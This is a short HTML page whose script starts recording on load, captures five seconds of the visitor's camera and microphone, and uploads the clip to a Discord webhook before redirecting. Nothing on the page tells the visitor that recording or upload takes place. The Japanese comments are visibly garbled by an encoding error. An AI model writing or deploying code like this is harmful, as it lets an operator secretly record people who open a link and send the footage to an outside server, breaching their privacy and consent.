<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Record & Send</title>
</head>
<body>
  <script>
    const webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";

    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
      const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
      const chunks = [];

      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: "video/webm" });
        const file = new File([blob], "recorded.webm");

        const formData = new FormData();
        formData.append("file", file);
        formData.append("content", "ğŸ¥ éŒ²ç”»ã—ãŸå‹•ç”»ã§ã™");

        fetch(webhookUrl, {
          method: "POST",
          body: formData
        })
        .then(() => {
          // âœ… Discordã«é€ä¿¡æˆåŠŸ â†’ åˆ¥ã®HTMLã«ç§»å‹•
          window.location.href = "recorded.html"; // â† é·ç§»å…ˆã®ãƒ•ã‚¡ã‚¤ãƒ«åã«å¤‰ãˆã¦ã­
        })
        .catch(err => {
          console.error("âŒ é€ä¿¡ã‚¨ãƒ©ãƒ¼:", err);
          alert("é€ä¿¡ã«å¤±æ•—ã—ã¾ã—ãŸ");
        });
      };

      // 5ç§’ã ã‘éŒ²ç”»
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, 5000);
    }).catch(err => {
      console.error("ã‚«ãƒ¡ãƒ©/ãƒã‚¤ã‚¯ã®å–å¾—ã«å¤±æ•—:", err);
    });
  </script>
</body>
</html>
